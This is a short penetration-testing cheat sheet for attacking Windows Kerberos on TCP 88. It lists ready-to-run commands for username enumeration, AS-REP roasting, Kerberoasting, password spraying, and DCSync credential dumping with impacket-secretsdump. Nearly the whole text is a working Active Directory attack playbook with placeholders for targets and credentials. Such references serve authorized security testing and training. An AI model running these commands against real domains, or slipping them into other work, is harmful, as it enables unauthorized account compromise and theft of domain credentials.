Microsoft Windows Kerberos — TCP 88
++++++++++++++++++++++++++++++++++++++++
nmap -p88 --open --script=krb5-enum-users -Pn -oA Kerberos <ip_address>

# Username enumeration (no creds) + AS-REP roast (no-preauth accounts):
kerbrute userenum -d <domain> --dc <ip_address> /usr/share/seclists/Usernames/Names/names.txt
impacket-GetNPUsers <domain>/ -dc-ip <ip_address> -usersfile users.txt -no-pass
nxc ldap <ip_address> -u <user> -p <password> --asreproast asrep.txt

# Kerberoast (needs valid creds) -> crack offline:
impacket-GetUserSPNs -request -dc-ip <ip_address> <domain>/<user>
nxc ldap <ip_address> -u <user> -p <password> --kerberoasting kerb.txt

# Password spray (careful with lockout policy):
kerbrute passwordspray -d <domain> --dc <ip_address> users.txt '<password>'

# DCSync / dump secrets once you have DA / replication rights:
impacket-secretsdump <domain>/Administrator:<password>@<ip_address>
impacket-secretsdump -just-dc <domain>/Administrator:<password>@<ip_address>
